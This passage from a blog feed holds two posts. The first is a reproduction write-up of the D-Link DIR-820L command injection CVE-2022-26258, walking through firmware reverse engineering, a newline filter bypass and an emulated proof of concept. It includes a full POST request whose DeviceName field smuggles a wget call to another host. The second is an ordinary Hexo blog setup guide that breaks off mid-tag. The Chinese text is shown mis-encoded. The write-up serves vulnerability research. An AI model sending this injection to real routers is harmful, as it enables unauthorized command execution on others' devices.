        <content type="html"><![CDATA[<h1 id="åˆ†æå›ºä»¶å’Œæ¼æ´"><a href="#åˆ†æå›ºä»¶å’Œæ¼æ´" class="headerlink" title="åˆ†æå›ºä»¶å’Œæ¼æ´"></a>åˆ†æå›ºä»¶å’Œæ¼æ´</h1><p>D-Link DIR-820Lè·¯ç”±å™¨å›ºä»¶ç‰ˆæœ¬1.05B03å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ŒCVEç¼–å·CVE-2022-26258ï¼Œé€šè¿‡CVEç½‘ç«™æŸ¥çœ‹ä¿¡æ¯ï¼Œå¾—çŸ¥æ¼æ´åœ¨ &#x2F;lan.asp é¡µé¢ä¸­çš„è®¾å¤‡åç§°å‚æ•°å‡ºäº†é—®é¢˜ã€‚ä»¥ä¸‹æ˜¯CVEçš„æè¿°ä¿¡æ¯ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392">ä½¿ç”¨binwalkè§£åŒ…æ—¶å¹¶æœªå‘ç°åŠ å¯†ï¼Œç›´æ¥å¾—åˆ°äº†squashfs-root æ–‡ä»¶ç³»ç»Ÿï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141224791.png" alt="image-20220425141224791"></p><p>æ‰¾åˆ° lan.asp æ–‡ä»¶ï¼Œæœç´¢â€œdeviceâ€å’Œâ€œnameâ€ç›¸å…³å…³é”®è¯ï¼Œå‘ç°æœ‰å¤šå¤„è°ƒç”¨ï¼š</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">onPageLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> lanCfg<span class="token punctuation">.</span>lanDeviceName<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token keyword">function</span> <span class="token function">send_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token keyword">var</span> lan_device_name <span class="token operator">=</span> <span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token keyword">function</span> <span class="token function">copyDataToDataModelFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span>paramStr <span class="token operator">+=</span> <span class="token string">'&amp;lanHostCfg_DeviceName_1.1.1.0='</span> <span class="token operator">+</span> <span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>duple<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token plain-text">show_words('DEVICE_NAME')</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token plain-text">:</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>340<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lan_device_name<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lan_device_name<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>15<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®¡è®¡ä»£ç ï¼Œå‘ç°<code>lan_device_name</code>ä½œä¸ºè¯·æ±‚å‚æ•°ï¼Œæ‹¼æ¥åˆ°<code>paramStr</code>ä¸­ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œç„¶åå°†å†…å®¹æäº¤åˆ°äº†<code>get_set.ccp</code> çš„URLä¸­ï¼Œï¼š</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">send_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token keyword">if</span><span class="token punctuation">(</span>submit_button_flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>submit_button_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">/*var restoreStrfor(var i=0; i&lt;25; i++)&#123;&#125;*/</span><span class="token function">deleteRedundentDatamodel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> submitObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ccpObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> submitParam <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"get_set.ccp"</span><span class="token punctuation">,</span><span class="token literal-property property">arg</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨<code>grep -r get_set .</code> æŸ¥æ‰¾è¿™ä¸ªURLçš„å¼•ç”¨ï¼Œå¹¶æ²¡æœ‰å‘ç°åä¸ºâ€œget_set.ccpâ€çš„æ–‡ä»¶ï¼Œä½†æœ‰è®¸å¤šaspæ–‡ä»¶éƒ½ä½¿ç”¨äº†è¿™ä¸ªURLï¼Œå¹¶ä¸”æœ‰å››ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­åŒ¹é…åˆ°äº†è¿™ä¸ªURLï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141254823.png" alt="image-20220425141254823"></p><p>æ—¢ç„¶æ²¡æœ‰â€œget_set.ccpâ€æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯è¿™ä¸ªURLä¼šäº¤ç»™åç«¯å¤„ç†ï¼Œå¤„ç†å¥½ä¹‹åè¿”å›ç»™ç”¨æˆ·ç»“æœã€‚æˆ‘ä»¬ä¾æ¬¡åˆ†æè¿™å››ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æœç´¢å­—ç¬¦ä¸²â€get_setâ€ï¼Œç»“æœflashã€smbdã€libcä¸æ˜¯å¾ˆåŒ¹é…ï¼Œå¯èƒ½æ€§è¾ƒä½ï¼Œè€Œncc2çš„å†…å®¹å¾ˆåŒ¹é…ï¼Œå®ƒä¸å…‰æœ‰å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰ç›¸å…³å‡½æ•°ï¼Œncc2ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141320141.png" alt="image-20220425141320141"></p><p>æ¥ä¸‹æ¥å¯¹ncc2è¿›è¡Œé€†å‘ï¼Œæœç´¢<code>system</code>ç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œå‘ç°å…³é”®é€»è¾‘ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141332645.png" alt="image-20220425141332645"></p><p>è¿™é‡Œå°†v4çš„å€¼æ‹¼æ¥åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œï¼Œç„¶åæ•´ä¸ªå­—ç¬¦ä¸²ä¼ ç»™<code>system</code>ï¼Œç›®å‰çœ‹æ¥å¹¶æœªå¯¹v4è¿›è¡Œæ£€æŸ¥ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯å‘½ä»¤æ³¨å…¥ç‚¹ã€‚</p><p>v4æ˜¯<code>getObj</code>å‡½æ•°çš„è¿”å›å€¼Objï¼Œéœ€è¦ç»•è¿‡<code>hasInjectionString</code>çš„åˆ¤æ–­æ‰èƒ½åˆ°è¾¾å‘½ä»¤æ³¨å…¥ç‚¹ï¼Œç°åœ¨éœ€è¦æ‰¾åˆ°<code>hasInjectionString</code> å‡½æ•°åœ¨å“ªä¸ªæ–‡ä»¶ä¸­ï¼ŒåŒæ ·ä½¿ç”¨<code>grep -r</code> å‘½ä»¤ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141346118.png" alt="image-20220425141346118"></p><p>è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªlibcæ–‡ä»¶ï¼Œç”¨IDAæ‰“å¼€ï¼Œç„¶ååˆ†ææ­¤å‡½æ•°ï¼Œå‘ç°å®ƒæ˜¯ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦æœ‰éæ³•å­—ç¬¦ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141357805.png" alt="image-20220425141357805"></p><p>ä½†æ˜¯è¿™é‡Œåªæ˜¯ä¸€äº›åŸºæœ¬çš„è¿‡æ»¤è§„åˆ™ï¼Œæ²¡æœ‰è¿‡æ»¤å†’å·å’Œæ¢è¡Œç¬¦ï¼Œå¯ä»¥ä½¿ç”¨â€œ\nâ€æ¥ç»•è¿‡ï¼Œæœ€ç»ˆè¾¾åˆ°å‘½ä»¤æ³¨å…¥çš„æ•ˆæœã€‚ç°åœ¨è¦éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ï¼Œéœ€è¦è¿›è¡Œå›ºä»¶ä»¿çœŸã€‚è¯•äº†ä¸€ä¸‹FrimAEå¯ä»¥ä»¿çœŸï¼Œè¿™æ ·å°±ä¸éœ€è¦æ‰‹åŠ¨å»æ¨¡æ‹Ÿäº†ï¼Œé¿å…äº†å¾ˆå¤šéº»çƒ¦ã€‚</p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>é¦–å…ˆä¸‹è½½FirmAEï¼Œç„¶åæŒ‰ç…§å®˜æ–¹æ–‡æ¡£ç»™å‡ºçš„å®‰è£…æ•™ç¨‹æŠŠç¯å¢ƒå®‰è£…å¥½ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone --recursive <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE<span class="token operator">></span><span class="token function">sudo</span> ./download.sh<span class="token function">sudo</span> ./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨downloadçš„æ—¶å€™é€Ÿåº¦éå¸¸æ…¢ï¼Œç”šè‡³å‡ºç°è¿æ¥æ–­æ‰çš„æƒ…å†µï¼Œå¯ä»¥æŸ¥çœ‹download.shè„šæœ¬ï¼Œç„¶åæ­ä¸Šæ¢¯å­æ‰‹åŠ¨ä¸‹è½½åˆ°binariesæ–‡ä»¶å¤¹ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">wget</span> -N --continue -P./binaries/ <span class="token variable">$*</span><span class="token punctuation">&#125;</span><span class="token builtin class-name">echo</span> <span class="token string">"Downloading binaries..."</span><span class="token builtin class-name">echo</span> <span class="token string">"Downloading kernel 2.6 (MIPS)..."</span>download <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE_kernel-v2.6/releases/download/v1.0/vmlinux.mipsel.<span class="token operator"><span class="token file-descriptor important">2</span>></span>download <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE_kernel-v2.6/releases/download/v1.0/vmlinux.mipseb.<span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸‹è½½å¥½ä¹‹åè¿è¡Œä»¿çœŸå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./init.sh<span class="token function">sudo</span> ./run.sh -a <span class="token operator">&lt;</span>brand<span class="token operator">></span> <span class="token operator">&lt;</span>firmware<span class="token operator">></span><span class="token function">sudo</span> ./run.sh -r <span class="token operator">&lt;</span>brand<span class="token operator">></span> <span class="token operator">&lt;</span>firmware<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>-a</code> è¿™æ¡å‘½ä»¤æ˜¯è§£æå›ºä»¶ï¼Œ<code>brand</code>å‚æ•°æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„æ ‡è¯†ç¬¦ï¼Œç„¶åè·Ÿä¸Šfirmware.binæ–‡ä»¶ï¼Œ<code>-r</code> è¿™æ¡å‘½ä»¤å°±æ˜¯è¿è¡Œä»¿çœŸäº†ã€‚ä»¿çœŸæˆåŠŸå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141412340.png" alt="image-20220425141412340"></p><p>ç„¶ååœ¨æµè§ˆå™¨è®¿é—®192.168.0.1ï¼Œå¯ä»¥è®¿é—®æˆåŠŸï¼Œè¿™é‡Œè¦æ±‚ç™»å½•ï¼Œé»˜è®¤å¯†ç ä¸ºç©ºï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141423322.png" alt="image-20220425141423322"></p><p>æ ¹æ®ä¹‹å‰çš„åˆ†æç»“æœï¼Œè®¿é—®lan.aspï¼Œçœ‹åˆ°é¡µé¢ç¡®å®åƒé¢„æµ‹çš„é‚£æ ·POSTæäº¤è¡¨å•åˆ°get_set.ccpçš„URLã€‚è¿™é‡Œæµ‹è¯•ä¿®æ”¹Device Nameç„¶åä½¿ç”¨burpsuiteæŠ“åŒ…çœ‹çœ‹å‚æ•°æ„æˆï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141433485.png" alt="image-20220425141433485"></p><p>æ­£å¦‚ä¹‹å‰åˆ†æçš„é‚£æ ·ï¼Œæ‰€æœ‰çš„å‚æ•°éƒ½æ‹¼æ¥èµ·æ¥äº†ã€‚ç„¶åå°è¯•å¯¹æ­¤å¤„ä½¿ç”¨æ¢è¡Œç¬¦ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯â€%0aâ€ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„éªŒè¯æ–¹æ³•ï¼Œå°±æ˜¯ç”¨python èµ·ä¸€ä¸ªç®€å•çš„HTTPæœåŠ¡ï¼Œç„¶åä½¿ç”¨wget å‘½ä»¤è¯·æ±‚è¿™ä¸ªHTTPæœåŠ¡ï¼Œå¦‚æœæˆåŠŸè¯·æ±‚ï¼Œåœ¨ç»ˆç«¯ä¸­å°±ä¼šè¾“å‡ºè¯·æ±‚çš„ç›¸å…³ä¿¡æ¯ï¼Œå¹¶ä¸”wgetä¼šä¸€ç›´å‘å‡ºè¯·æ±‚ï¼Œç”¨äºæµ‹è¯•åœ¨åˆé€‚ä¸è¿‡äº†ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python -m SimpleHTTPServer <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€åä¿®æ”¹Device Nameè¿™æ¡å‚æ•°ï¼Œæœ€åè¯·æ±‚å¤´å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;get_set.ccp HTTP&#x2F;1.1Host: 192.168.0.1Content-Length: 765Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36Content-Type: application&#x2F;x-www-form-urlencodedOrigin: &lt;http:&#x2F;&#x2F;192.168.0.1&gt;Referer: &lt;http:&#x2F;&#x2F;192.168.0.1&#x2F;lan.asp&gt;Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q&#x3D;0.9Cookie: hasLogin&#x3D;Â§1Â§Connection: closeccp_act&#x3D;Â§setÂ§&amp;old_ip&#x3D;Â§192.168.0.1Â§&amp;old_mask&#x3D;Â§255.255.255.0Â§&amp;new_ip&#x3D;Â§192.168.0.1Â§&amp;new_mask&#x3D;Â§255.255.255.0Â§&amp;nextPage&#x3D;Â§lan.aspÂ§&amp;lanHostCfg_IPAddress_1.1.1.0&#x3D;Â§192.168.0.1Â§&amp;lanHostCfg_SubnetMask_1.1.1.0&#x3D;Â§255.255.255.0Â§&amp;lanHostCfg_DomainName_1.1.1.0&#x3D;Â§Â§&amp;lanHostCfg_DNSRelay_1.1.1.0&#x3D;Â§1Â§&amp;lanHostCfg_DHCPServerEnable_1.1.1.0&#x3D;Â§1Â§&amp;lanHostCfg_MinAddress_1.1.1.0&#x3D;Â§192.168.0.100Â§&amp;lanHostCfg_MaxAddress_1.1.1.0&#x3D;Â§192.168.0.200Â§&amp;lanHostCfg_DHCPLeaseTime_1.1.1.0&#x3D;Â§1440Â§&amp;lanHostCfg_DeviceName_1.1.1.0&#x3D;Â§%0awget &lt;http:&#x2F;&#x2F;192.168.0.2&gt;%0aÂ§&amp;lanHostCfg_AlwaysBroadcast_1.1.1.0&#x3D;Â§0Â§&amp;lanHostCfg_NetBIOSAnnouncement_1.1.1.0&#x3D;Â§0Â§&amp;lanHostCfg_NetBIOSLearn_1.1.1.0&#x3D;Â§0Â§&amp;lanHostCfg_NetBIOSScope_1.1.1.0&#x3D;Â§Â§&amp;lanHostCfg_NetBIOSNodeType_1.1.1.0&#x3D;Â§2Â§&amp;lanHostCfg_PrimaryWINSAddress_1.1.1.0&#x3D;Â§0.0.0.0Â§&amp;lanHostCfg_SecondaryWINSAddress_1.1.1.0&#x3D;Â§0.0.0.0Â§&amp;1650509593486&#x3D;Â§1650509593486Â§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ç»ˆç«¯ä¸­çœ‹åˆ°æ¥è‡ª192.168.0.1çš„è¯·æ±‚ï¼Œè¯´æ˜å‘½ä»¤æ³¨å…¥æˆåŠŸï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141445337.png" alt="image-20220425141445337"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://iotsec-zone.com/article?id=123">IOTsec-Zone ç‰©è”ç½‘å®‰å…¨ç¤¾åŒº | D-Link CVE-2022-26258 å‘½ä»¤æ³¨å…¥</a></p><p><a href="https://github.com/skyedai910/Vuln/tree/master/DIR-820L/command_execution_0">Vuln&#x2F;DIR-820L&#x2F;command_execution_0 at master Â· skyedai910&#x2F;Vuln</a></p><p><a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26258">CVE - CVE-2022-26258</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoæ­å»ºåšå®¢</title>
      <link href="/2022/04/24/hexo-da-jian-bo-ke/"/>
      <url>/2022/04/24/hexo-da-jian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="å®‰è£…é…ç½®Hexo"><a href="#å®‰è£…é…ç½®Hexo" class="headerlink" title="å®‰è£…é…ç½®Hexo"></a>å®‰è£…é…ç½®Hexo</h1><p>å®‰è£…nodeç¯å¢ƒ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> <span class="token function">node</span><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ¬åœ°æ–°å»ºæ–‡ä»¶å¤¹ï¼Œç„¶ååˆå§‹åŒ–hexo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> blog<span class="token builtin class-name">cd</span> bloghexo init blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>blogæ–‡ä»¶å¤¹ä¸ºæ ¹æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­é…ç½®æ–‡ä»¶ _config.yml æ˜¯é…ç½® hexo çš„ï¼Œå¦å¤–åœ¨ themes æ–‡ä»¶å¤¹ä¸‹ä¹Ÿæœ‰  _config.yml æ–‡ä»¶ï¼Œæ˜¯ç”¨äºé…ç½®ä¸»é¢˜çš„ã€‚</p><p>åœ¨GitHubæ–°å»ºä»“åº“ï¼Œä»“åº“åä¸º [githubç”¨æˆ·å].github.io ï¼Œä¿®æ”¹æ ¹æ–‡ä»¶å¤¹ä¸‹çš„ _config.yml çš„ deploy é…ç½®ï¼Œå°† repo æ”¹ä¸ºåˆšæ‰çš„ä»“åº“è·¯å¾„ï¼Œtype æ”¹ä¸ºâ€œgitâ€ï¼Œå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">deploy:  type: &#39;git&#39;  repo: https:&#x2F;&#x2F;github.com&#x2F;unrav31&#x2F;unrav31.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å®‰è£…hexo-deployer-gitï¼Œè¿™æ ·æ‰èƒ½å°†æœ¬åœ°æ–‡ä»¶éƒ¨ç½²åˆ°githubä¸­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éšåæŒ‰é¡ºåºè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>hexo clean</code>ï¼šæ¸…é™¤ç¼“å­˜</p><p><code>hexo g</code>ï¼šhexo generateï¼Œç”Ÿæˆ</p><p><code>hexo d</code>ï¼šhexo deployï¼Œéƒ¨ç½²åˆ°github</p><p>è¿™æ—¶å€™å¯ä»¥åœ¨github.ioæŸ¥çœ‹åˆ°æ­å»ºå¥½çš„é¡¹ç›®äº†ã€‚</p><h1 id="é…ç½®Hexoä¸»é¢˜"><a href="#é…ç½®Hexoä¸»é¢˜" class="headerlink" title="é…ç½®Hexoä¸»é¢˜"></a>é…ç½®Hexoä¸»é¢˜</h1><p>é»˜è®¤ä¸»é¢˜ä¸æ˜¯å¾ˆå¥½çœ‹ï¼Œæˆ‘è¿™é‡Œæ˜¯ç”¨çš„ <a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">blinkfox</a> ï¼Œå¯ä»¥åœ¨ <a href="https://hexo.io/themes/">themes</a> æ‰¾åˆ°è‡ªå·±å–œæ¬¢çš„ä¸»é¢˜ã€‚</p><p>è¿›å…¥åˆ° themes æ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åä¸‹è½½blinkfoxï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> themes<span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¿®æ”¹hexoæ ¹ç›®å½•ä¸‹çš„ <strong>_config.yml</strong> æ–‡ä»¶çš„ <code>themes</code> å€¼ï¼š</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">theme: hexo-theme-matery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…³äº _config.yml çš„å…¶ä»–ä¿®æ”¹å»ºè®®ï¼š</p><ul><li>ä¿®æ”¹ <code>_config.yml</code> çš„ <code>url</code> çš„å€¼ä¸ºä½ çš„ç½‘ç«™ä¸» <code>URL</code>ï¼ˆå¦‚ï¼š<code>http://xxx.github.io</code>ï¼‰ã€‚</li><li>å»ºè®®ä¿®æ”¹ä¸¤ä¸ª <code>per_page</code> çš„åˆ†é¡µæ¡æ•°å€¼ä¸º <code>6</code> çš„å€æ•°ï¼Œå¦‚ï¼š<code>12</code>ã€<code>18</code> ç­‰ï¼Œè¿™æ ·æ–‡ç« åˆ—è¡¨åœ¨å„ä¸ªå±å¹•ä¸‹éƒ½èƒ½è¾ƒå¥½çš„æ˜¾ç¤ºã€‚</li><li>å¦‚æœä½ æ˜¯ä¸­æ–‡ç”¨æˆ·ï¼Œåˆ™å»ºè®®ä¿®æ”¹ <code>language</code> çš„å€¼ä¸º <code>zh-CN</code>ã€‚</li></ul><p>æœ€ååœ¨æ ¹ç›®å½•ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šæ“ä½œå°±å®Œæˆæ›´æ”¹ä¸»é¢˜äº†ã€‚</p><p>å…¶ä»–æ›´å¤šçš„é…ç½®ä¿®æ”¹æ–¹æ³•è§ <a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">å®˜æ–¹æ‰‹å†Œ</a> ã€‚</p><p>æ•ˆæœå›¾ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220424232123575.png?token=ATQEVQUFDYSYS5EO5RXOJILCMYC5K" alt="image-20220424232123575"></p><h1 id="è®¾ç½®å›¾åºŠ"><a href="#è®¾ç½®å›¾åºŠ" class="headerlink" title="è®¾ç½®å›¾åºŠ"></a>è®¾ç½®å›¾åºŠ</h1><p>å›¾ç‰‡åœ¨ typora ä¸­æ˜¯æœ¬åœ°æ–‡ä»¶å­˜å‚¨çš„ï¼Œåœ¨hexoéƒ¨ç½²ä¹‹åæ— æ³•æŸ¥çœ‹å›¾ç‰‡ï¼Œè¿™æ—¶éœ€è¦åœ¨è¿œç¨‹æ­å»ºä¸€ä¸ªå›¾åºŠã€‚</p><p>å›¾åºŠå¯ä»¥æœ‰å¤šç§æ–¹å¼ï¼Œæˆ‘è¿™é‡Œé€‰æ‹© github ä½œä¸ºå›¾åºŠï¼Œå› ä¸ºå®ƒå…è´¹ã€‚</p><p>é¦–å…ˆåœ¨ github æ–°å»ºä¸€ä¸ªä»“åº“ï¼Œéœ€è¦æ˜¯å…¬å¼€çš„ä»“åº“å¦åˆ™æ— æ³•æŸ¥çœ‹å›¾ç‰‡ã€‚ç„¶åä¸‹è½½ <a href="https://github.com/Molunerfinn/picgo/releases">PicGo</a> è¿›è¡Œè®¾ç½®ï¼š</p><p><img 